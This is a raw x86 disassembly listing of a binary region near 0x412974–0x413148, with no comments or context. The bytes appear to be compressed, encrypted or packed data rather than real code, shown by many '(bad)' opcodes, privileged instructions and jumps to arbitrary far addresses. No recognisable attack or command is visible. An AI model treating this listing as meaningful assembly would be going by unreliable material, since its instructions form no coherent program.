  412974:	inc    ebp
  412975:	add    al,0x1f
  412977:	xchg   esi,eax
  412978:	add    esp,edx
  41297a:	loopne 0x4129b4
  41297c:	inc    eax
  41297d:	nop
  41297e:	fisubr DWORD PTR [edi+edi*2]
  412981:	mov    ds:0x777b305b,al
  412986:	xor    DWORD PTR [edx+0x5b],esi
  412989:	pop    edx
  41298a:	sar    DWORD PTR [edx-0x29],0x42
  41298e:	or     ch,al
  412990:	push   0x76
  412992:	jae    0x412932
  412994:	push   edi
  412995:	dec    ebx
  412996:	push   ds
  412997:	sbb    bh,BYTE PTR [esi]
  412999:	(bad)  
  41299a:	jnp    0x412a17
  41299c:	push   edx
  41299d:	cmp    esp,ecx
  41299f:	or     esp,DWORD PTR [esi]
  4129a1:	lea    esp,[edx+0x33]
  4129a4:	mov    esi,0x130e9da9
  4129a9:	arpl   WORD PTR [esi],bx
  4129ab:	jnp    0x412935
  4129ad:	and    bl,BYTE PTR [eiz*1-0x124cfb7]
  4129b4:	pop    ecx
  4129b5:	cld    
  4129b6:	sub    al,0xee
  4129b8:	jno    0x412a09
  4129ba:	adc    al,0xdf
  4129bc:	xchg   ebx,eax
  4129bd:	outs   dx,DWORD PTR ds:[esi]
  4129be:	mov    dh,0xc9
  4129c0:	and    al,dl
  4129c2:	lods   al,BYTE PTR ds:[esi]
  4129c3:	(bad)  [esi+0x2501d754]
  4129c9:	mov    ebx,0x849fa892
  4129ce:	cmp    dh,bh
  4129d0:	cld    
  4129d1:	add    al,0x80
  4129d3:	jmp    0x30fa:0xab0bc91
  4129da:	sub    BYTE PTR [edi-0x5045c14],bh
  4129e0:	jns    0x412a41
  4129e2:	jmp    0x635ca3cc
  4129e7:	sbb    al,0x6c
  4129e9:	lods   al,BYTE PTR ds:[esi]
  4129ea:	add    eax,0xcc97d364
  4129ef:	retf   
  4129f0:	and    eax,0x2ee843c6
  4129f5:	xchg   ebp,eax
  4129f6:	popa   
  4129f7:	icebp  
  4129f8:	das    
  4129f9:	ins    DWORD PTR es:[edi],dx
  4129fa:	scas   al,BYTE PTR es:[edi]
  4129fb:	sbb    dh,BYTE PTR [edi-0x55]
  4129fe:	cdq    
  4129ff:	aaa    
  412a00:	mov    edi,0xbb99dd7a
  412a05:	cmp    BYTE PTR [edi-0x43],bl
  412a08:	add    eax,0xa59a81c2
  412a0d:	xchg   DWORD PTR [ebp+0x2e77843],ebx
  412a13:	test   eax,0x924ad9f4
  412a18:	(bad)  
  412a19:	pop    es
  412a1a:	mov    esi,0x68e12c68
  412a1f:	pop    eax
  412a20:	cmp    al,0xa6
  412a22:	cld    
  412a23:	mov    al,ds:0xc5daeb2a
  412a28:	inc    eax
  412a29:	jno    0x412a26
  412a2b:	and    eax,0x80d7514a
  412a30:	dec    ecx
  412a31:	sub    esi,DWORD PTR [ebx+0x31]
  412a34:	pop    esp
  412a35:	fwait
  412a36:	pop    ss
  412a37:	xchg   esp,eax
  412a38:	aad    0xaa
  412a3a:	cmp    eax,0xe832e2d
  412a3f:	outs   dx,BYTE PTR ds:[esi]
  412a40:	neg    DWORD PTR [ecx]
  412a42:	out    dx,al
  412a43:	lea    edi,[esi+0x3d]
  412a46:	xchg   edx,eax
  412a47:	pop    es
  412a48:	mov    eax,0xb492fa20
  412a4d:	jo     0x412a82
  412a4f:	out    dx,eax
  412a50:	push   ss
  412a51:	xor    eax,0x19ac4d22
  412a56:	jg     0x412a96
  412a58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a59:	inc    ecx
  412a5a:	mov    al,0x8a
  412a5c:	shl    BYTE PTR [ebx],0xc5
  412a5f:	pusha  
  412a60:	xor    ecx,DWORD PTR [eax]
  412a62:	push   ecx
  412a63:	xor    DWORD PTR [eax+0x45],esp
  412a66:	pop    esp
  412a67:	ror    al,1
  412a69:	mov    al,ds:0x318d1641
  412a6e:	loop   0x4129fa
  412a70:	lods   eax,DWORD PTR ds:[esi]
  412a71:	mov    ds:0x3af96351,eax
  412a76:	or     ah,bl
  412a78:	in     eax,dx
  412a79:	mov    dl,0x61
  412a7b:	dec    ecx
  412a7c:	jle    0x412a74
  412a7e:	xchg   ecx,eax
  412a80:	adc    eax,0x38756d05
  412a85:	and    al,0x83
  412a87:	fisub  WORD PTR [esi+eiz*4-0x48]
  412a8b:	xchg   esi,ebp
  412a8d:	loop   0x412ac9
  412a8f:	mov    cl,BYTE PTR [edi+edi*8]
  412a92:	fwait
  412a93:	scas   eax,DWORD PTR es:[edi]
  412a94:	sbb    DWORD PTR [eax-0x52],ebp
  412a97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a98:	nop
  412a99:	push   ecx
  412a9a:	loop   0x412a96
  412a9c:	add    BYTE PTR [ebx+eax*4],cl
  412a9f:	jecxz  0x412a7c
  412aa1:	jmp    0xcf6e:0x46b68813
  412aa8:	fisub  WORD PTR [eax-0x2e]
  412aab:	inc    edi
  412aac:	cdq    
  412aad:	mov    cl,0xa3
  412aaf:	repnz inc edx
  412ab1:	out    dx,eax
  412ab2:	(bad)  
  412ab4:	test   eax,0x4fcc09e8
  412ab9:	cmp    ecx,DWORD PTR [ebx+0x5b]
  412abc:	mov    al,0x7f
  412abe:	push   ds
  412abf:	pop    eax
  412ac0:	pusha  
  412ac1:	std    
  412ac2:	fdiv   st,st(1)
  412ac4:	adc    edi,edx
  412ac6:	adc    bl,BYTE PTR [eax]
  412ac8:	jecxz  0x412a71
  412aca:	int    0x65
  412acc:	adc    bh,cl
  412ace:	pusha  
  412acf:	mov    dl,BYTE PTR ds:0x1dc5ce5d
  412ad5:	mov    eax,ds:0xdabf5334
  412ada:	(bad)  
  412adb:	shr    eax,1
  412add:	fisttp WORD PTR ds:0xd71d6a51
  412ae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ae4:	or     al,0x10
  412ae6:	push   ebp
  412ae7:	dec    eax
  412ae8:	je     0x412b39
  412aea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412aeb:	ret    0xf545
  412aee:	(bad)  [eax]
  412af0:	add    BYTE PTR [edx-0x78aa6b8d],cl
  412af6:	lods   al,BYTE PTR ds:[esi]
  412af7:	jns    0x412b76
  412af9:	sti    
  412afa:	dec    esp
  412afb:	xchg   esp,eax
  412afc:	call   FWORD PTR ds:0xa34d05b4
  412b02:	inc    esi
  412b03:	add    DWORD PTR [esi],ebx
  412b05:	(bad)  
  412b06:	loopne 0x412aa3
  412b08:	adc    al,0x7e
  412b0a:	stos   BYTE PTR es:[edi],al
  412b0b:	retf   
  412b0c:	add    al,0x86
  412b0e:	repnz pop ebp
  412b10:	or     BYTE PTR [ebx+0x6386718],dh
  412b16:	hlt    
  412b17:	stos   BYTE PTR es:[edi],al
  412b18:	mov    ch,0x2a
  412b1a:	pop    ebx
  412b1b:	test   dl,ah
  412b1d:	dec    esi
  412b1e:	and    bl,0x10
  412b21:	and    al,0x26
  412b23:	fadd   QWORD PTR [edx+0xfb92b49]
  412b29:	cmp    eax,0x7f57359e
  412b2e:	iret   
  412b2f:	imul   DWORD PTR [eax-0x63]
  412b32:	add    eax,0xd2903b3c
  412b37:	dec    edx
  412b38:	push   esi
  412b39:	cs inc esi
  412b3b:	inc    edi
  412b3c:	aaa    
  412b3d:	cmp    al,0x84
  412b3f:	dec    edi
  412b40:	aas    
  412b41:	scas   al,BYTE PTR es:[edi]
  412b42:	aam    0x19
  412b44:	mov    ebp,cr1
  412b47:	xor    BYTE PTR [eax],al
  412b49:	xor    eax,0xf5930921
  412b4e:	icebp  
  412b4f:	xchg   ebx,eax
  412b50:	test   al,0xea
  412b52:	iret   
  412b53:	inc    edx
  412b54:	ret    
  412b55:	mov    bh,0x93
  412b57:	pop    ebx
  412b58:	jl     0x412b47
  412b5a:	push   ds
  412b5b:	push   0x52aa9e07
  412b60:	or     al,al
  412b62:	mov    ch,ch
  412b64:	cdq    
  412b65:	mov    ch,0x69
  412b67:	std    
  412b68:	sbb    al,0xcd
  412b6a:	cdq    
  412b6b:	and    edx,DWORD PTR [esi+0x3744bad]
  412b71:	and    ebx,DWORD PTR [ebx+0x72]
  412b74:	fwait
  412b75:	loopne 0x412b0f
  412b77:	mov    al,0x1a
  412b79:	sbb    eax,0x81bd8359
  412b7e:	cmp    DWORD PTR [edi+esi*2-0x40],edi
  412b82:	repnz pop ebp
  412b84:	mov    ah,bl
  412b86:	sbb    BYTE PTR [ebx+edi*1+0x5efef916],al
  412b8d:	les    esi,FWORD PTR [edi]
  412b8f:	int    0x8f
  412b91:	jge    0x412b38
  412b93:	sbb    edx,DWORD PTR [edx-0x7e]
  412b96:	in     al,0x54
  412b98:	xor    eax,0x4c5b0d2
  412b9d:	test   bh,ah
  412b9f:	test   BYTE PTR [ecx-0x6e3bc46f],al
  412ba5:	(bad)  
  412ba6:	sbb    eax,0x979ea688
  412bab:	push   ss
  412bac:	xor    DWORD PTR [ebx+edi*1+0x35],esp
  412bb0:	push   esi
  412bb1:	jb     0x412b76
  412bb3:	and    edx,DWORD PTR [ebx+0x3d]
  412bb6:	xor    BYTE PTR [eax+0x25795ccc],ah
  412bbc:	fsubr  DWORD PTR [esi+0x2640b43f]
  412bc2:	in     al,dx
  412bc3:	ins    BYTE PTR es:[edi],dx
  412bc4:	enter  0xf9aa,0x7a
  412bc8:	pop    edx
  412bc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bca:	adc    al,0xeb
  412bcc:	add    esp,esi
  412bce:	test   eax,0x310a3a19
  412bd3:	and    eax,0x8efa9441
  412bd8:	push   0x96b238bc
  412bdd:	ds xchg ebp,eax
  412bdf:	mov    WORD PTR [edi-0x73],es
  412be2:	fnstcw WORD PTR [edx+0x24]
  412be5:	push   0xffffff99
  412be7:	xor    BYTE PTR [eax+0x30],0xb3
  412beb:	mov    ch,0x51
  412bed:	leave  
  412bee:	bound  esp,QWORD PTR [eax-0x6f00021a]
  412bf4:	jns    0x412b8d
  412bf6:	enter  0xcbc9,0xe7
  412bfa:	enter  0xe77d,0xe7
  412bfe:	xor    dh,dh
  412c00:	jb     0x412ba2
  412c02:	or     DWORD PTR [eax+0x58498ab],eax
  412c08:	int3   
  412c09:	rol    DWORD PTR [ebx+eiz*2+0x34ba78d1],1
  412c10:	pop    edi
  412c11:	in     eax,dx
  412c12:	jp     0x412bae
  412c14:	mov    al,ds:0x75963b95
  412c19:	xchg   ecx,eax
  412c1a:	imul   DWORD PTR [ebx]
  412c1c:	dec    edi
  412c1d:	addr16 jge 0x412c0f
  412c20:	lock mov ebp,0x197eba52
  412c26:	cwde   
  412c27:	dec    esi
  412c28:	xor    eax,0xb725d15
  412c2d:	les    ebp,FWORD PTR [esi+0x73]
  412c30:	in     al,dx
  412c31:	or     al,0x9
  412c33:	inc    ebp
  412c34:	mov    cl,cl
  412c36:	jge    0x412c44
  412c38:	xor    DWORD PTR [ebp-0x1d],edi
  412c3b:	mov    bl,BYTE PTR [edi+eiz*1+0xfbfd11b]
  412c42:	out    dx,eax
  412c43:	mov    bh,0x7b
  412c45:	fisttp DWORD PTR es:[ecx+eax*2]
  412c49:	mov    ebx,0x863f51b
  412c4e:	into   
  412c4f:	imul   DWORD PTR [ebp-0x490c2caa]
  412c55:	leave  
  412c56:	inc    ebp
  412c57:	fdivr  QWORD PTR [edi+eiz*2]
  412c5a:	jmp    0x412c6d
  412c5c:	fdivr  QWORD PTR [esi-0x262202f4]
  412c62:	push   0xf3cddd82
  412c67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c68:	jbe    0x412c13
  412c6a:	cwde   
  412c6b:	sbb    al,0x5c
  412c6d:	mov    al,0xd3
  412c6f:	and    DWORD PTR [ebx-0x5a],esi
  412c72:	data16 std 
  412c74:	sub    al,0x91
  412c76:	(bad)  
  412c78:	in     al,dx
  412c79:	aad    0x60
  412c7b:	xor    DWORD PTR [ecx+0x72],eax
  412c7e:	mov    DWORD PTR [edx+0x79],ebp
  412c81:	inc    edi
  412c82:	in     eax,dx
  412c83:	aas    
  412c84:	shl    DWORD PTR [esi-0x2c5ae823],cl
  412c8a:	mov    esi,0xebbac03
  412c8f:	or     eax,0xa4233c86
  412c94:	and    edi,0x65
  412c97:	or     ch,BYTE PTR [esi]
  412c99:	inc    edi
  412c9a:	push   ecx
  412c9b:	jmp    0x79d0:0x1f3f98ab
  412ca2:	or     eax,0x4fcea836
  412ca7:	xchg   edi,eax
  412ca8:	inc    ecx
  412ca9:	leave  
  412caa:	mov    esi,0x28118e28
  412caf:	call   0x3cb7dee2
  412cb4:	jmp    0x412cb4
  412cb6:	adc    al,0xe9
  412cb8:	clc    
  412cb9:	mov    DWORD PTR [eax+0x6aa6e576],ebp
  412cbf:	nop
  412cc0:	sub    BYTE PTR [ebx+0x4e04ebd3],bl
  412cc6:	addr16 inc ecx
  412cc8:	xor    bh,BYTE PTR [ebp+ebp*4-0x2f733801]
  412ccf:	push   esp
  412cd0:	lea    ebp,[eax]
  412cd2:	add    ch,ah
  412cd4:	inc    ebp
  412cd5:	xor    esi,eax
  412cd7:	pop    ecx
  412cd8:	xor    cl,BYTE PTR [edi+0x51]
  412cdb:	jp     0x412cd9
  412cdd:	fmul   DWORD PTR [edi]
  412cdf:	sbb    cl,ch
  412ce1:	push   edi
  412ce2:	jge    0x412d28
  412ce4:	dec    esi
  412ce5:	cmp    dh,BYTE PTR [ebx]
  412ce7:	add    BYTE PTR [eax],dl
  412ce9:	dec    esp
  412cea:	dec    ebp
  412ceb:	xchg   esp,eax
  412cec:	mov    ds:0x99075ef2,al
  412cf1:	xchg   ebx,eax
  412cf2:	push   edi
  412cf3:	xchg   ebx,eax
  412cf4:	cmp    al,ah
  412cf6:	jbe    0x412cec
  412cf8:	sbb    ebp,DWORD PTR [ecx+0x7383b1d8]
  412cfe:	push   ds
  412cff:	mov    cl,0x1c
  412d01:	imul   ecx,DWORD PTR ds:0xe23bbb3b,0x7d4dea7d
  412d0b:	mov    al,0x98
  412d0d:	rcr    ecx,1
  412d0f:	pop    esi
  412d10:	pop    esp
  412d11:	mov    cl,0xa8
  412d13:	cmp    WORD PTR [ebp-0x2],sp
  412d17:	ret    
  412d18:	and    ebp,DWORD PTR [ebx+0x74cef26]
  412d1e:	jne    0x412d71
  412d20:	pop    ecx
  412d21:	pop    ebx
  412d22:	sbb    bl,BYTE PTR [ecx-0xbb2136c]
  412d28:	mov    ebx,0xe307225
  412d2d:	clc    
  412d2e:	cli    
  412d2f:	pop    eax
  412d30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d31:	imul   edx,esp,0x4dac1192
  412d37:	cld    
  412d38:	or     ebp,eax
  412d3a:	fst    QWORD PTR [edi]
  412d3c:	into   
  412d3d:	or     al,0x8e
  412d3f:	out    0xfd,eax
  412d41:	adc    BYTE PTR [ecx],0x9d
  412d44:	sti    
  412d45:	mov    ebx,0x77c5de48
  412d4a:	pushf  
  412d4b:	(bad)  [ecx+eiz*2-0x6]
  412d4f:	stos   DWORD PTR es:[edi],eax
  412d50:	xor    eax,0x6dd80a99
  412d55:	bound  esp,QWORD PTR [edi-0x8930801]
  412d5b:	popf   
  412d5c:	aad    0x13
  412d5e:	cwde   
  412d5f:	mov    dl,BYTE PTR [ebp-0x50d37768]
  412d65:	sbb    dl,bh
  412d67:	fsubr  QWORD PTR [edx-0xe]
  412d6a:	cmp    eax,0xa8009a32
  412d6f:	cli    
  412d70:	mov    eax,ds:0x4e1f975d
  412d75:	push   ds
  412d76:	ss outs dx,BYTE PTR ss:[esi]
  412d79:	adc    al,0x8f
  412d7b:	test   al,0x8a
  412d7d:	jl     0x412dce
  412d7f:	add    bl,BYTE PTR [esi+eiz*1]
  412d82:	sub    BYTE PTR [esi],dh
  412d84:	and    al,0x3d
  412d86:	cmp    cl,BYTE PTR [eax-0x61d87458]
  412d8c:	es (bad) 
  412d8f:	lods   eax,DWORD PTR ds:[esi]
  412d90:	dec    ebx
  412d91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d92:	ins    BYTE PTR es:[edi],dx
  412d93:	inc    esp
  412d94:	daa    
  412d95:	cmp    dh,dl
  412d97:	mov    ch,0x7
  412d99:	dec    BYTE PTR [esi+0x31ea33c1]
  412d9f:	mov    dh,0xe
  412da1:	stc    
  412da2:	jg     0x412da3
  412da4:	adc    eax,0xbc7d9611
  412da9:	mov    edi,DWORD PTR [ebp-0x72ff6782]
  412daf:	mov    eax,0x19c5c81c
  412db4:	es jne 0x412e19
  412db7:	pop    ebx
  412db8:	or     BYTE PTR [esi-0x5c],ch
  412dbb:	xor    DWORD PTR [edx],ecx
  412dbd:	jge    0x412e18
  412dbf:	mov    edi,0x73d7cea6
  412dc4:	test   eax,0xbd014ca8
  412dc9:	into   
  412dca:	dec    ebx
  412dcb:	inc    ebx
  412dcc:	ins    BYTE PTR es:[edi],dx
  412dcd:	call   0x7a49:0xdb0bc374
  412dd4:	or     DWORD PTR [ebx+0x1c],ebp
  412dd7:	out    0x85,al
  412dd9:	add    BYTE PTR [ebx],0x63
  412ddc:	cmc    
  412ddd:	nop
  412dde:	cmp    eax,0x941a02d1
  412de3:	cld    
  412de4:	mov    ch,0xca
  412de6:	nop
  412de7:	mov    dh,0x70
  412de9:	dec    edi
  412dea:	pop    esi
  412deb:	popa   
  412dec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ded:	mov    esi,0x12bede06
  412df2:	cwde   
  412df3:	or     eax,0x498c5643
  412df8:	sub    BYTE PTR [ebx],dh
  412dfa:	jl     0x412e67
  412dfc:	inc    ebp
  412dfd:	test   esi,edx
  412dff:	not    DWORD PTR [edx-0x14]
  412e02:	pop    ebx
  412e03:	push   ebx
  412e04:	jge    0x412e7e
  412e06:	in     eax,dx
  412e07:	push   ebx
  412e08:	push   ds
  412e09:	dec    ebx
  412e0a:	or     DWORD PTR [ebp+0x16],esi
  412e0d:	cmp    eax,DWORD PTR [esi+0x11ebc60d]
  412e13:	and    eax,0x72252a6e
  412e18:	inc    edx
  412e19:	fst    QWORD PTR ds:0x38fd7f58
  412e1f:	cwde   
  412e20:	int    0xbb
  412e22:	sti    
  412e23:	and    cl,BYTE PTR [eax]
  412e25:	out    dx,eax
  412e26:	sbb    al,0xaa
  412e28:	fcmovnb st,st(2)
  412e2a:	jg     0x412e6b
  412e2c:	cmp    ecx,ebx
  412e2e:	sbb    edi,esi
  412e30:	call   0x419a:0xc0af6390
  412e37:	ja     0x412e74
  412e39:	call   0x6044:0x5a4209c9
  412e40:	jle    0x412e6c
  412e42:	mov    bh,0x43
  412e44:	pushf  
  412e45:	pop    ss
  412e46:	lods   al,BYTE PTR ds:[esi]
  412e47:	jnp    0x412df8
  412e49:	jbe    0x412e8c
  412e4b:	pop    esi
  412e4c:	daa    
  412e4d:	sbb    DWORD PTR [esi-0x79],ecx
  412e50:	in     eax,dx
  412e51:	mov    ch,0x8e
  412e53:	mov    ebx,0x861cb049
  412e58:	mov    ds:0xf444d8b3,al
  412e5d:	cs ins BYTE PTR es:[edi],dx
  412e5f:	sub    DWORD PTR [edi+0x76],0x2610ca95
  412e66:	jecxz  0x412e52
  412e68:	(bad)  
  412e69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e6a:	mov    ah,0x84
  412e6c:	outs   dx,DWORD PTR ds:[esi]
  412e6d:	dec    edx
  412e6e:	leave  
  412e6f:	sub    DWORD PTR [esi+0x2e],esp
  412e72:	push   ebx
  412e73:	mov    ebp,0x9d9de83b
  412e79:	stos   DWORD PTR es:[edi],eax
  412e7a:	lock and ch,bh
  412e7d:	aam    0x49
  412e7f:	icebp  
  412e80:	mov    fs,ebp
  412e82:	or     bh,bh
  412e84:	jae    0x412e06
  412e86:	xchg   ebx,eax
  412e87:	dec    edi
  412e88:	int3   
  412e89:	push   eax
  412e8a:	or     BYTE PTR [esi],bl
  412e8c:	mov    eax,ds:0xce004a66
  412e91:	enter  0xc103,0xa
  412e95:	mov    ebx,0xfcbf6383
  412e9a:	leave  
  412e9b:	dec    esi
  412e9c:	mov    esp,0x4b786c94
  412ea1:	mov    eax,0xc901cfde
  412ea6:	cmp    ebx,ecx
  412ea8:	stos   DWORD PTR es:[edi],eax
  412ea9:	sahf   
  412eaa:	stos   BYTE PTR es:[edi],al
  412eab:	dec    ecx
  412eac:	and    BYTE PTR [edi-0x2a],ah
  412eaf:	shl    DWORD PTR [ebx-0x12],cl
  412eb2:	inc    eax
  412eb3:	ret    
  412eb4:	or     eax,0x6cfba351
  412eb9:	xor    al,0xe4
  412ebb:	or     al,0x1
  412ebd:	ficomp WORD PTR [ebx]
  412ebf:	push   ss
  412ec0:	(bad)  
  412ec1:	daa    
  412ec2:	and    al,0x98
  412ec4:	jecxz  0x412ed2
  412ec6:	xor    eax,0x164f1d9
  412ecb:	mov    esi,0xb757245d
  412ed0:	push   eax
  412ed1:	add    eax,0x746e3f12
  412ed6:	int3   
  412ed7:	jb     0x412f4a
  412ed9:	dec    edx
  412eda:	or     edx,ecx
  412edc:	cmp    DWORD PTR [edi+0x10],esi
  412edf:	daa    
  412ee0:	iret   
  412ee1:	sub    al,0x97
  412ee3:	xor    BYTE PTR [edi+ebp*4-0x4a36cb24],bl
  412eea:	scas   eax,DWORD PTR es:[edi]
  412eeb:	in     eax,dx
  412eec:	aam    0x20
  412eee:	out    0x58,eax
  412ef0:	dec    ebx
  412ef1:	imul   esp,DWORD PTR [ebx-0x1dd46c9b],0xffffffca
  412ef8:	cmp    BYTE PTR [ecx-0x2a596d3d],cl
  412efe:	in     al,0x57
  412f00:	js     0x412ebf
  412f02:	mov    DWORD PTR [eax+0x9],0x43d9b5d9
  412f09:	aad    0xd5
  412f0b:	sub    al,0xaa
  412f0d:	loop   0x412eb2
  412f0f:	sbb    DWORD PTR [ebp+0x204fd5d],esi
  412f15:	aad    0x5a
  412f17:	adc    BYTE PTR [eax+0x22],dh
  412f1a:	add    DWORD PTR [ecx+0x30],edi
  412f1d:	repnz aam 0xc
  412f20:	sar    BYTE PTR [ebp-0x75],cl
  412f23:	stos   BYTE PTR es:[edi],al
  412f24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f25:	jmp    0xb502:0xb2c71cb6
  412f2c:	mov    dl,0xaf
  412f2e:	jmp    0xdde2:0xaeefbb8d
  412f35:	xchg   BYTE PTR [eax],bl
  412f37:	fmul   DWORD PTR es:[edi+0x1b]
  412f3b:	add    eax,0x70ee8d81
  412f40:	dec    eax
  412f41:	jecxz  0x412fb0
  412f43:	lea    ebp,[edi*2+0x74ff1307]
  412f4a:	rcr    DWORD PTR ds:0x2f7a54ac,1
  412f50:	or     dl,bl
  412f52:	imul   eax,edi,0x47ec5c64
  412f58:	sbb    al,0x5f
  412f5a:	push   ecx
  412f5b:	jp     0x412f29
  412f5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f5e:	jmp    0x1be38c8c
  412f63:	call   0xd689ef85
  412f68:	mov    bl,BYTE PTR [eax-0x7349eb34]
  412f6e:	dec    edx
  412f6f:	enter  0x878f,0xce
  412f73:	adc    al,0xdc
  412f75:	push   cs
  412f76:	xor    DWORD PTR fs:[eax],0x6a2fe07c
  412f7d:	sub    BYTE PTR [esi],ch
  412f7f:	repnz rdpmc 
  412f82:	inc    ecx
  412f83:	and    edi,DWORD PTR [esi]
  412f85:	fwait
  412f86:	in     al,0x31
  412f88:	push   0xffffff8f
  412f8a:	push   ebp
  412f8b:	xlat   BYTE PTR ds:[ebx]
  412f8c:	cli    
  412f8d:	mov    cl,0x6a
  412f8f:	mov    cl,0x50
  412f91:	mov    eax,0x92796f61
  412f96:	ins    BYTE PTR es:[edi],dx
  412f97:	repnz mov dh,0x82
  412f9a:	icebp  
  412f9b:	lds    edi,FWORD PTR [edx+0x7f]
  412f9e:	xchg   ebp,eax
  412f9f:	jae    0x413004
  412fa1:	mov    edi,DWORD PTR [ebx-0x3f]
  412fa4:	jp     0x412f65
  412fa6:	pop    esi
  412fa7:	in     al,0x6a
  412fa9:	int    0x4c
  412fab:	mov    esi,0xf96aaa4c
  412fb0:	nop
  412fb1:	sbb    DWORD PTR [eax],0xffffff93
  412fb4:	dec    ecx
  412fb5:	(bad)  [eax]
  412fb7:	mov    edx,0x6f3bd802
  412fbc:	fnstsw WORD PTR [ecx+0xf]
  412fbf:	push   esp
  412fc0:	xor    esp,esi
  412fc2:	out    0x75,eax
  412fc4:	sub    al,0x84
  412fc6:	adc    DWORD PTR [edi-0x5ffe9b23],edx
  412fcc:	daa    
  412fcd:	inc    ebp
  412fce:	rol    DWORD PTR ds:0x7bacf08e,0x9b
  412fd5:	enter  0x5039,0x24
  412fd9:	bound  ebp,QWORD PTR [edi-0x45]
  412fdc:	sti    
  412fdd:	pop    es
  412fde:	retf   
  412fdf:	lods   al,BYTE PTR ds:[esi]
  412fe0:	cmp    esp,ecx
  412fe2:	aad    0x31
  412fe4:	pusha  
  412fe5:	out    dx,eax
  412fe6:	and    BYTE PTR es:[ebx+eiz*8],ah
  412fea:	pop    edi
  412feb:	cli    
  412fec:	xor    DWORD PTR [ecx-0x29de59d8],ecx
  412ff2:	leave  
  412ff3:	and    cl,BYTE PTR [ebp+0x12]
  412ff6:	sub    ah,dh
  412ff8:	sub    eax,0xa98bfe9b
  412ffd:	aas    
  412ffe:	inc    edi
  412fff:	cmp    al,0x88
  413001:	lock imul edx,DWORD PTR [edx+0x1d22ff9a],0x45cbc274
  41300c:	fsubr  QWORD PTR [ebx]
  41300e:	add    ebp,esi
  413010:	sahf   
  413011:	test   al,0x8d
  413013:	addr16 pop ds
  413015:	(bad)  
  413017:	in     eax,dx
  413018:	push   esp
  413019:	jmp    0x5b8d:0xc584f920
  413020:	neg    ah
  413022:	pop    esi
  413023:	mov    al,0x67
  413025:	cmp    al,0x2e
  413027:	hlt    
  413028:	sub    eax,DWORD PTR [eax*4+0x746c120]
  41302f:	dec    esp
  413030:	and    eax,0x7368421e
  413035:	add    eax,0x87ceea10
  41303a:	out    dx,al
  41303b:	pop    edi
  41303c:	jo     0x413096
  41303e:	adc    ch,dl
  413040:	and    al,0xe9
  413042:	fidiv  WORD PTR [ecx+ecx*8+0x4f]
  413046:	pop    ss
  413047:	or     edx,ebx
  413049:	repnz sbb eax,0xd1b7d765
  41304f:	ins    BYTE PTR es:[di],dx
  413051:	sbb    al,0x48
  413053:	int    0x2a
  413055:	ret    
  413056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413057:	jno    0x412fe2
  413059:	push   es
  41305a:	sar    BYTE PTR [ecx-0x5],cl
  41305d:	xchg   esp,eax
  41305e:	out    0x58,al
  413060:	sbb    esp,DWORD PTR [ecx]
  413062:	pop    ebp
  413063:	loopne 0x4130a5
  413065:	or     ecx,DWORD PTR [ebx]
  413067:	and    al,0xef
  413069:	sbb    DWORD PTR [ebx],esp
  41306b:	mov    cl,0xbb
  41306d:	mov    al,ds:0x9950bf3
  413072:	loop   0x413031
  413074:	repnz aaa 
  413076:	enter  0xe6,0xb7
  41307a:	mov    ebp,0x70ab78b0
  41307f:	push   ds
  413080:	call   0xe24a:0x564d7a20
  413087:	add    DWORD PTR [edx+0x5888509d],ecx
  41308d:	aad    0x5f
  41308f:	mov    eax,ds:0xccbc9ae0
  413094:	mov    ebx,0xfdb3f1bc
  413099:	sub    al,BYTE PTR [esi-0x6c]
  41309c:	(bad)  [ecx+0x5a5c4dc0]
  4130a2:	jno    0x413121
  4130a4:	xor    BYTE PTR [ebx],ah
  4130a6:	xor    BYTE PTR [eax],ch
  4130a8:	repz add ah,dh
  4130ab:	lea    eax,[eax-0x3a]
  4130ae:	int    0xde
  4130b0:	jecxz  0x413052
  4130b2:	jo     0x4130f1
  4130b4:	fidivr DWORD PTR [eax]
  4130b6:	xor    eax,0x1d85a906
  4130bb:	mov    dl,BYTE PTR [ebx]
  4130bd:	(bad)  [ebp+edx*2-0x3a75cffc]
  4130c4:	adc    eax,0x717a2e95
  4130c9:	push   es
  4130ca:	mov    ecx,0x7ab05ac
  4130cf:	cli    
  4130d0:	scas   al,BYTE PTR es:[edi]
  4130d1:	push   ss
  4130d2:	fcom   DWORD PTR ds:0xa5ddfc8c
  4130d8:	cmp    DWORD PTR [esi-0x7c8d4af8],0x400cd166
  4130e2:	je     0x4130a6
  4130e4:	ja     0x4130cc
  4130e6:	leave  
  4130e7:	jmp    0x41308b
  4130e9:	push   ds
  4130ea:	mov    ch,bl
  4130ec:	mov    ebp,0x96caa026
  4130f1:	jbe    0x41314a
  4130f3:	jnp    0x413165
  4130f5:	sbb    ecx,eax
  4130f7:	push   eax
  4130f8:	mov    DWORD PTR [ebx+ecx*1-0x78],edi
  4130fc:	cld    
  4130fd:	xchg   esp,eax
  4130fe:	(bad)  [ecx-0x125d3570]
  413104:	sbb    ebx,DWORD PTR [esi-0x76]
  413107:	jae    0x413147
  413109:	ret    
  41310a:	mov    edx,0x166e19d3
  41310f:	int    0xc5
  413111:	test   eax,0x139933b
  413116:	jb     0x413102
  413118:	pop    ecx
  413119:	outs   dx,BYTE PTR ds:[esi]
  41311a:	rcl    ebp,0x88
  41311d:	and    eax,0xce91bdcb
  413122:	xor    edx,esp
  413124:	retf   0x1f7e
  413127:	cmp    BYTE PTR [edx+0x28],dh
  41312a:	mov    ds:0xf77080a8,eax
  41312f:	sti    
  413130:	push   ds
  413131:	fldcw  WORD PTR [edi+ebx*8-0x4bcabc7e]
  413138:	or     eax,DWORD PTR [ecx]
  41313a:	pop    ebx
  41313b:	dec    ebp
  41313c:	mov    ds:0x3479497c,al
  413141:	adc    eax,0x9f70125b
  413146:	inc    ebx
  413147:	das    
  413148:	mov    eax,0x2acb0b13
